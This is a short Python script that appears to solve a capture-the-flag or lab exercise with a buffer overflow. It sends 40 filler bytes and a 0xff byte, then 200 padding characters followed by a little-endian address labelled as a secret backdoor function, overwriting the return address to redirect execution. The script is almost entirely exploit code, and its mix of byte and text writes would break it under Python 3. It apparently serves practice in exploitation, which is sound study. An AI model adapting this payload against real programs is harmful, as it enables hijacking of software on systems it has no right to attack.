import sys, time

nops = "a" * 200

addr_secret_backdoor = "\x8c\x48\x55\x55\x55\x55\x00\x00" #0x000055555555488c

payload = nops + addr_secret_backdoor + "\n"


sys.stdout.write(b"A"*40 + b"\xff" + b"\n")
sys.stdout.flush()
time.sleep(0.2)
sys.stdout.write(payload)
sys.stdout.flush()
